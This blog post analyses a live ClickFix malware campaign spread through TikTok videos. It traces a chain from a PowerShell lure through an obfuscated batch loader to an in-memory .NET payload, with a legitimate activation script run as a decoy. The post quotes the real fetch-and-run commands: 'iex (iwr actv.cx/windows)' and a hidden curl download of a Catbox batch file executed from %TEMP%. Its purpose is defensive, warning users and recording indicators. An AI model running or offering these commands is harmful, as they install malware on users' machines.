---
title: "Malware Analysis for Beginners"
description: "Follow my real-world malware analysis of a ClickFix attack spreading on TikTok. Learn step-by-step how to analyze malware chains, uncover fileless loaders, and protect yourself from modern threats."
tags:
  - Cybersecurity
  - Malware Analysis
  - TikTok
  - ClickFix
  - Fileless Malware
author: "jimididit"
authorTwitter: "@jimididit"
date: "2025-06-09"
category: "Malware Analysis"
image: /assets/blog/tiktok-clickfix-malware-analysis.webp
---


# Malware Analysis for Beginners: Tracking a Live TikTok PowerShell Malware Chain

**Meta Description:** Follow a real-world malware analysis of an evolving TikTok PowerShell malware campaign. Learn how staged loaders, obfuscated batch files, and memory-only payloads are used in modern attacks.

---

## Introduction

Malware analysis isn't just about static samplesâ€”it's about watching live campaigns evolve in real time.  

Recently, I began tracking an active malware chain spreading through **TikTok videos**. What began as a simple curiosity has grown into a fully evolving campaign with dynamic payloads, staged loaders, and clever obfuscation.

This post documents my analysis so farâ€”and I will continue updating it as the threat actor evolves their tooling.

---

## ğŸ“… Timeline of Events â€” TikTok PowerShell Malware Chain

### 1ï¸âƒ£ Initial TikTok Video

The AI generated video tells viewers to run this command:

```powershell

iex (iwr actv.cx/windows)
```

Claimed to offer a "**Windows activation / unlock / utility**."  
**Reality:** Social engineering trick to get users to run arbitrary PowerShell.

---

### 2ï¸âƒ£ The \`actv.cx/windows` URL

At time of analysis, this URL was live.

It returns this code:

```powershell

Start-Process -WindowStyle Hidden -FilePath cmd.exe -ArgumentList '/c curl -k -L -sS https://files.catbox.moe/<filename>.bat -o "%TEMP%\1.cmd" && "%TEMP%\1.cmd"'
irm https://get.activated.win | iex
```

**Two parts:**

âœ… Downloads and runs a batch file from Catbox  
âœ… Executes \`get.activated.win` â†’ legitimate Microsoft Activation Scripts (MAS) â†’ used as cover/distraction

---

### 3ï¸âƒ£ Batch File â€” Evolving Payload

- Initially: \`[https:]//files.catbox.moe/e699c1.bat`  
- Later updated to: \`[https:]//files.catbox.moe/bqhjfq.bat`

**Finding:** The attacker is actively maintaining this chainâ€”files and naming are evolving.

---

### 4ï¸âƒ£ The Batch File (\`1.cmd`) â€” Core Payload

**Highly obfuscated \`.cmd` file**, over **256KB** in size.

![Batch File](/assets/blog/tiktok-clickfix-malware-analysis/anyrun-screenshot_1.png)

**Techniques used:**

- Garbage text ("couch dignity purpose stuff disease...") â†’ AV evasion  
- Obfuscated \`set` statements:

```batch

@echo off
...
set "ODQD=..."
set "oWMV=..."
...
```

**Variables combined dynamically:**

```batch

%ODQD%%oWMV%%gZpKDK% â†’ PowerShell code
```

**Goal:** Reconstruct an obfuscated PowerShell loader on the fly.

---

### 5ï¸âƒ£ PowerShell Loader Behavior

When the batch completes building the PowerShell command, it performs this chain:

```powershell

$X0WP46Cw = [Convert]::FromBase64String(...)
TripleDES decrypt
GZIP decompress
SHA256 hash verify
Reflective .NET assembly load
EntryPoint.Invoke
```

Loader construction varies:  
- **Older version:** used environment variables (split with \`#`)  
- **Latest version:** uses inline variables + split with \`=`.

---

### 6ï¸âƒ£ Analysis Findings From Latest Run

âœ… \`FromBase64String()` was called â†’ loader reached this stage.  
âŒ In this run, environment variables were empty â†’ payload failed to reconstruct â†’ no malware executed.  
âœ… \`get.activated.win` ran successfully â†’ legitimate MAS â†’ used as cover/misdirection.

---

### 7ï¸âƒ£ Purpose of `get.activated.win`

**Legitimate MAS utility**, used cleverly by the attacker:

- Makes the user think the command was safe ("Oh, I got a Windows activator!")  
- Obfuscates process tree (PowerShell appears busy with legit activity)  
- Possibly keeps PowerShell process alive longer to allow malware to execute fully.

---

### 8ï¸âƒ£ Overall Malware Chain Architecture

```plaintext

TikTok â†’ iex (iwr actv.cx/windows)
â†’ actv.cx/windows â†’ Start-Process curl [https:]//files.catbox.moe/...bat â†’ 1.cmd
â†’ 1.cmd â†’ reconstructs obfuscated PowerShell loader
â†’ PowerShell loader â†’ builds base64 â†’ decrypt â†’ decompress â†’ .NET EXE reflectively loaded
â†’ MAS runs in parallel as decoy
```

---

### 9ï¸âƒ£ Threat Actor Behavior

Indicators that the threat actor is **actively maintaining and improving** the chain:

âœ… **Catbox .bat filename changed** â†’ e699c1.bat â†’ bqhjfq.bat  
âœ… **Split character changed** â†’ \`#` â†’ \`=`  
âœ… **Variable names randomized** in each \`.bat` â†’ implies an automated builder/toolkit.

**Final payload:** not fully captured in this run â†’ likely rotates dynamically or is controlled via server-side updates.

---

## Final Summary

This **TikTok campaign is not a prank**â€”it delivers a live, evolving malware loader.

**Key characteristics:**

- Batch â†’ dynamic PowerShell â†’ in-memory .NET EXE  
- MAS utility used for cover/misdirection  
- Attacker is actively maintaining the chain â†’ suggests a real, ongoing threat effort.

### Final Flow Diagram (Textual)

```plaintext

TikTok video â†’ iex (iwr actv.cx/windows)
â†“
actv.cx/windows â†’ Start-Process curl ... files.catbox.moe/bqhjfq.bat â†’ "%TEMP%\1.cmd"
â†“
1.cmd â†’ Obfuscated set statements â†’ Reconstructs PowerShell loader
â†“
PowerShell:
â†’ FromBase64String â†’ TripleDES decrypt â†’ GZIP decompress â†’ .NET EXE load â†’ EntryPoint.Invoke
â†“
Parallel: MAS utility runs (get.activated.win) â†’ User thinks everything is legit
```

---

## Next Steps

I will continue tracking this campaign:

âœ… Deobfuscate the full current \`1.cmd` payload  
âœ… Identify any new infrastructure/C2 endpoints  
âœ… Monitor for further filename/variable/toolkit changes  
âœ… Update this blog post with future findings

---

## Takeaway for Users

ğŸš© **NEVER trust PowerShell tricks you see on social media**â€”especially anything invoking:

```powershell

iex (iwr ...)
```

**This campaign is a textbook example of:**
- Fileless malware
- Dynamic staging
- In-memory execution
- Social engineering + legit cover activity

---

## Stay Updated

ğŸ‘‰ Follow this blog for future updates on this campaign  
ğŸ‘‰ Check out my [GitHub](https://github.com/jimididit) for tools and analysis scripts  
ğŸ‘‰ Join the **Nokturnal Community Discord** to collaborate on real-world malware analysis

Stay safe â€” and stay curious. ğŸ”

